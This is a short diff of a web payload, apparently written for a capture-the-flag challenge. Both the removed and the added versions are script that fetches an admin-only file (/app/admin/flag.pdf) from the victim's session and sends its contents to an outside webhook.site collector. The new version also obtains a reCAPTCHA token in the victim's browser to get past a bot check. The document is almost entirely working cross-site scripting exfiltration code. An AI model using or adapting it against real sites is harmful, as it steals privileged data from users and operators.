@@ -1,13 +1,12 @@
-<!DOCTYPE html>
-<html>
-  <body>
-    <h1>test</h1>
-    <script>
-      fetch("/app/admin/flag.pdf")
-        .then(r => r.text())
-        .then(flag => {
-          fetch("https://webhook.site/abcd1234-abcd-1234-efgh-5678ijklmnop?data=" + encodeURIComponent(flag));
-        });
-    </script>
-  </body>
-</html>
+<script src="https://www.google.com/recaptcha/api.js?render=6LfENuMqAAAAACKXzqxsFr5PvFOg1OlBBu_o5_Vf"></script>
+<script>
+grecaptcha.ready(function() {
+  grecaptcha.execute('6LfENuMqAAAAACKXzqxsFr5PvFOg1OlBBu_o5_Vf', {action: 'submit'}).then(function(token) {
+    fetch("/app/admin/flag.pdf?token=" + token)
+      .then(r => r.text())
+      .then(flag => {
+        fetch("https://webhook.site/본인주소?flag=" + encodeURIComponent(flag));
+      });
+  });
+});
+</script>
